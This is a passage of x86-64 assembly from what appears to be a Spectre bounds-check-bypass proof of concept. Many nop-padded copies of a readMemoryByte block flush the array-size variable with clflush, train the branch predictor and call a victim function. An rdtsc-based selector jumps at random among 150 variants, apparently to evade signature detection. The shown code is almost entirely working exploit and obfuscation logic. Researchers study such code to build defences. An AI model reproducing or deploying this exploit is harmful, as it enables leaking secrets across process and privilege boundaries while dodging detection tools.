	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 90
.LreadMemoryByte_win6_var90:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 91
.LreadMemoryByte_win6_var91:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 92
.LreadMemoryByte_win6_var92:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 93
.LreadMemoryByte_win6_var93:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 94
.LreadMemoryByte_win6_var94:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 95
.LreadMemoryByte_win6_var95:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 96
.LreadMemoryByte_win6_var96:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 97
.LreadMemoryByte_win6_var97:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	nop
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 98
.LreadMemoryByte_win6_var98:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	nop
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 99
.LreadMemoryByte_win6_var99:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 100
.LreadMemoryByte_win6_var100:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 101
.LreadMemoryByte_win6_var101:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 102
.LreadMemoryByte_win6_var102:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	nop
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 103
.LreadMemoryByte_win6_var103:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 104
.LreadMemoryByte_win6_var104:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 105
.LreadMemoryByte_win6_var105:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 106
.LreadMemoryByte_win6_var106:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 107
.LreadMemoryByte_win6_var107:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 108
.LreadMemoryByte_win6_var108:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 109
.LreadMemoryByte_win6_var109:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 110
.LreadMemoryByte_win6_var110:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 111
.LreadMemoryByte_win6_var111:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 112
.LreadMemoryByte_win6_var112:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 113
.LreadMemoryByte_win6_var113:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 114
.LreadMemoryByte_win6_var114:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 115
.LreadMemoryByte_win6_var115:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 116
.LreadMemoryByte_win6_var116:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 117
.LreadMemoryByte_win6_var117:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 118
.LreadMemoryByte_win6_var118:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 119
.LreadMemoryByte_win6_var119:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 120
.LreadMemoryByte_win6_var120:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 121
.LreadMemoryByte_win6_var121:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 122
.LreadMemoryByte_win6_var122:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	nop
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 123
.LreadMemoryByte_win6_var123:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 124
.LreadMemoryByte_win6_var124:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 125
.LreadMemoryByte_win6_var125:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 126
.LreadMemoryByte_win6_var126:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 127
.LreadMemoryByte_win6_var127:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 128
.LreadMemoryByte_win6_var128:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 129
.LreadMemoryByte_win6_var129:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 130
.LreadMemoryByte_win6_var130:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 131
.LreadMemoryByte_win6_var131:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 132
.LreadMemoryByte_win6_var132:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 133
.LreadMemoryByte_win6_var133:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 134
.LreadMemoryByte_win6_var134:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 135
.LreadMemoryByte_win6_var135:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 136
.LreadMemoryByte_win6_var136:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 137
.LreadMemoryByte_win6_var137:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 138
.LreadMemoryByte_win6_var138:
	popq	%rax
	nop
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 139
.LreadMemoryByte_win6_var139:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 140
.LreadMemoryByte_win6_var140:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 141
.LreadMemoryByte_win6_var141:
	popq	%rax
	nop
	nop
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 142
.LreadMemoryByte_win6_var142:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 143
.LreadMemoryByte_win6_var143:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 144
.LreadMemoryByte_win6_var144:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 145
.LreadMemoryByte_win6_var145:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 146
.LreadMemoryByte_win6_var146:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 147
.LreadMemoryByte_win6_var147:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
	nop
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	movl	$0, -116(%rbp)
	nop
	jmp	.LreadMemoryByte_win6_continue
## Variant 148
.LreadMemoryByte_win6_var148:
	popq	%rax
	cmpl	$0, -60(%rbp)
	nop
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	clflush	_array1_size(%rip)
	nop
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
## Variant 149
.LreadMemoryByte_win6_var149:
	popq	%rax
	cmpl	$0, -60(%rbp)
	jl	LBB1_18
## %bb.12:                              ##   in Loop: Header=BB1_11 Depth=2
	nop
	nop
	clflush	_array1_size(%rip)
	nop
	movl	$0, -116(%rbp)
	jmp	.LreadMemoryByte_win6_continue
.LreadMemoryByte_win6_continue:
LBB1_13:                                ##   Parent Loop BB1_5 Depth=1
                                        ##     Parent Loop BB1_11 Depth=2
                                        ## =>    This Inner Loop Header: Depth=3
	movl	-116(%rbp), %eax
	cmpl	$1000, %eax    # # imm = 0x3E8
	jge	LBB1_16
## %bb.14:                              ##   in Loop: Header=BB1_13 Depth=3
	jmp	LBB1_15
LBB1_15:                                ##   in Loop: Header=BB1_13 Depth=3
	movl	-116(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -116(%rbp)
	jmp	LBB1_13
LBB1_16:                                ##   in Loop: Header=BB1_11 Depth=2
	movl	-60(%rbp), %eax
	movl	$6, %ecx
	cltd
	idivl	%ecx
	movl	%edx, %eax
	subl	$1, %eax
	andl	$-65536, %eax    # # imm = 0xFFFF0000
	cltq
	movq	%rax, -88(%rbp)
	movq	-88(%rbp), %rax
	movq	-88(%rbp), %rcx
	shrq	$16, %rcx
	orq	%rcx, %rax
	movq	%rax, -88(%rbp)
	movq	-80(%rbp), %rax
	movq	-88(%rbp), %rcx
	movq	-32(%rbp), %rdx
	xorq	-80(%rbp), %rdx
	andq	%rdx, %rcx
	xorq	%rcx, %rax
	movq	%rax, -88(%rbp)
	movq	-88(%rbp), %rdi
	callq	_victim_function
## %bb.17:                              ##   in Loop: Header=BB1_11 Depth=2
	movl	-60(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -60(%rbp)
	jmp	LBB1_11
LBB1_18:                                ##   in Loop: Header=BB1_5 Depth=1
	movl	$0, -56(%rbp)
LBB1_19:                                ##   Parent Loop BB1_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$150, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win5_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win5_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win5_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win5_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win5_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win5_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win5_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win5_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win5_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win5_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win5_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win5_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win5_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win5_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win5_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win5_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win5_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win5_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win5_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win5_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win5_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win5_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win5_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win5_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win5_var24
	cmpl	$25, %eax
	je	.LreadMemoryByte_win5_var25
	cmpl	$26, %eax
	je	.LreadMemoryByte_win5_var26
	cmpl	$27, %eax
	je	.LreadMemoryByte_win5_var27
	cmpl	$28, %eax
	je	.LreadMemoryByte_win5_var28
	cmpl	$29, %eax
	je	.LreadMemoryByte_win5_var29
	cmpl	$30, %eax
	je	.LreadMemoryByte_win5_var30
	cmpl	$31, %eax
	je	.LreadMemoryByte_win5_var31
	cmpl	$32, %eax
	je	.LreadMemoryByte_win5_var32
	cmpl	$33, %eax
	je	.LreadMemoryByte_win5_var33
	cmpl	$34, %eax
	je	.LreadMemoryByte_win5_var34
	cmpl	$35, %eax
	je	.LreadMemoryByte_win5_var35
	cmpl	$36, %eax
	je	.LreadMemoryByte_win5_var36
	cmpl	$37, %eax
	je	.LreadMemoryByte_win5_var37
	cmpl	$38, %eax
	je	.LreadMemoryByte_win5_var38
	cmpl	$39, %eax
	je	.LreadMemoryByte_win5_var39
	cmpl	$40, %eax
	je	.LreadMemoryByte_win5_var40
	cmpl	$41, %eax
	je	.LreadMemoryByte_win5_var41
	cmpl	$42, %eax
	je	.LreadMemoryByte_win5_var42
	cmpl	$43, %eax
	je	.LreadMemoryByte_win5_var43
	cmpl	$44, %eax
	je	.LreadMemoryByte_win5_var44
	cmpl	$45, %eax
	je	.LreadMemoryByte_win5_var45
	cmpl	$46, %eax
	je	.LreadMemoryByte_win5_var46
	cmpl	$47, %eax
	je	.LreadMemoryByte_win5_var47
	cmpl	$48, %eax
	je	.LreadMemoryByte_win5_var48
	cmpl	$49, %eax
	je	.LreadMemoryByte_win5_var49
	cmpl	$50, %eax
	je	.LreadMemoryByte_win5_var50
	cmpl	$51, %eax
	je	.LreadMemoryByte_win5_var51
	cmpl	$52, %eax
	je	.LreadMemoryByte_win5_var52
	cmpl	$53, %eax
	je	.LreadMemoryByte_win5_var53
	cmpl	$54, %eax
	je	.LreadMemoryByte_win5_var54
	cmpl	$55, %eax
	je	.LreadMemoryByte_win5_var55
	cmpl	$56, %eax
	je	.LreadMemoryByte_win5_var56
	cmpl	$57, %eax
	je	.LreadMemoryByte_win5_var57
	cmpl	$58, %eax
	je	.LreadMemoryByte_win5_var58
	cmpl	$59, %eax
	je	.LreadMemoryByte_win5_var59
	cmpl	$60, %eax
	je	.LreadMemoryByte_win5_var60
	cmpl	$61, %eax
	je	.LreadMemoryByte_win5_var61
	cmpl	$62, %eax
	je	.LreadMemoryByte_win5_var62
	cmpl	$63, %eax
	je	.LreadMemoryByte_win5_var63
	cmpl	$64, %eax
	je	.LreadMemoryByte_win5_var64
	cmpl	$65, %eax
	je	.LreadMemoryByte_win5_var65
	cmpl	$66, %eax
	je	.LreadMemoryByte_win5_var66
	cmpl	$67, %eax
	je	.LreadMemoryByte_win5_var67
	cmpl	$68, %eax
	je	.LreadMemoryByte_win5_var68
	cmpl	$69, %eax
	je	.LreadMemoryByte_win5_var69
	cmpl	$70, %eax
	je	.LreadMemoryByte_win5_var70
	cmpl	$71, %eax
	je	.LreadMemoryByte_win5_var71
	cmpl	$72, %eax
	je	.LreadMemoryByte_win5_var72
	cmpl	$73, %eax
	je	.LreadMemoryByte_win5_var73
	cmpl	$74, %eax
	je	.LreadMemoryByte_win5_var74
	cmpl	$75, %eax
	je	.LreadMemoryByte_win5_var75
	cmpl	$76, %eax
	je	.LreadMemoryByte_win5_var76
	cmpl	$77, %eax
	je	.LreadMemoryByte_win5_var77
	cmpl	$78, %eax
	je	.LreadMemoryByte_win5_var78
	cmpl	$79, %eax
	je	.LreadMemoryByte_win5_var79
	cmpl	$80, %eax
	je	.LreadMemoryByte_win5_var80
	cmpl	$81, %eax
	je	.LreadMemoryByte_win5_var81
	cmpl	$82, %eax
	je	.LreadMemoryByte_win5_var82
	cmpl	$83, %eax
	je	.LreadMemoryByte_win5_var83
	cmpl	$84, %eax
	je	.LreadMemoryByte_win5_var84
	cmpl	$85, %eax
	je	.LreadMemoryByte_win5_var85
	cmpl	$86, %eax
	je	.LreadMemoryByte_win5_var86
	cmpl	$87, %eax
	je	.LreadMemoryByte_win5_var87
	cmpl	$88, %eax
	je	.LreadMemoryByte_win5_var88
	cmpl	$89, %eax
	je	.LreadMemoryByte_win5_var89
	cmpl	$90, %eax
	je	.LreadMemoryByte_win5_var90
	cmpl	$91, %eax
	je	.LreadMemoryByte_win5_var91
	cmpl	$92, %eax
	je	.LreadMemoryByte_win5_var92
	cmpl	$93, %eax
	je	.LreadMemoryByte_win5_var93
	cmpl	$94, %eax
	je	.LreadMemoryByte_win5_var94
	cmpl	$95, %eax
	je	.LreadMemoryByte_win5_var95
	cmpl	$96, %eax
	je	.LreadMemoryByte_win5_var96
	cmpl	$97, %eax
	je	.LreadMemoryByte_win5_var97
	cmpl	$98, %eax
	je	.LreadMemoryByte_win5_var98
	cmpl	$99, %eax
	je	.LreadMemoryByte_win5_var99
	cmpl	$100, %eax
	je	.LreadMemoryByte_win5_var100
	cmpl	$101, %eax
	je	.LreadMemoryByte_win5_var101
	cmpl	$102, %eax
	je	.LreadMemoryByte_win5_var102
	cmpl	$103, %eax
	je	.LreadMemoryByte_win5_var103
	cmpl	$104, %eax
	je	.LreadMemoryByte_win5_var104
	cmpl	$105, %eax
	je	.LreadMemoryByte_win5_var105
	cmpl	$106, %eax
	je	.LreadMemoryByte_win5_var106
	cmpl	$107, %eax
	je	.LreadMemoryByte_win5_var107
	cmpl	$108, %eax
	je	.LreadMemoryByte_win5_var108
	cmpl	$109, %eax
	je	.LreadMemoryByte_win5_var109
	cmpl	$110, %eax
	je	.LreadMemoryByte_win5_var110
	cmpl	$111, %eax
	je	.LreadMemoryByte_win5_var111
	cmpl	$112, %eax
	je	.LreadMemoryByte_win5_var112
	cmpl	$113, %eax
	je	.LreadMemoryByte_win5_var113
	cmpl	$114, %eax
	je	.LreadMemoryByte_win5_var114
	cmpl	$115, %eax
	je	.LreadMemoryByte_win5_var115
	cmpl	$116, %eax
	je	.LreadMemoryByte_win5_var116
	cmpl	$117, %eax
	je	.LreadMemoryByte_win5_var117
	cmpl	$118, %eax
	je	.LreadMemoryByte_win5_var118
	cmpl	$119, %eax
	je	.LreadMemoryByte_win5_var119
	cmpl	$120, %eax
	je	.LreadMemoryByte_win5_var120
	cmpl	$121, %eax
	je	.LreadMemoryByte_win5_var121
	cmpl	$122, %eax
	je	.LreadMemoryByte_win5_var122
	cmpl	$123, %eax
	je	.LreadMemoryByte_win5_var123
	cmpl	$124, %eax
	je	.LreadMemoryByte_win5_var124
	cmpl	$125, %eax
	je	.LreadMemoryByte_win5_var125
	cmpl	$126, %eax
	je	.LreadMemoryByte_win5_var126
	cmpl	$127, %eax
	je	.LreadMemoryByte_win5_var127
	cmpl	$128, %eax
	je	.LreadMemoryByte_win5_var128
	cmpl	$129, %eax
	je	.LreadMemoryByte_win5_var129
	cmpl	$130, %eax
	je	.LreadMemoryByte_win5_var130
	cmpl	$131, %eax
	je	.LreadMemoryByte_win5_var131
	cmpl	$132, %eax
	je	.LreadMemoryByte_win5_var132
	cmpl	$133, %eax
	je	.LreadMemoryByte_win5_var133
	cmpl	$134, %eax
	je	.LreadMemoryByte_win5_var134
	cmpl	$135, %eax
	je	.LreadMemoryByte_win5_var135
	cmpl	$136, %eax
	je	.LreadMemoryByte_win5_var136
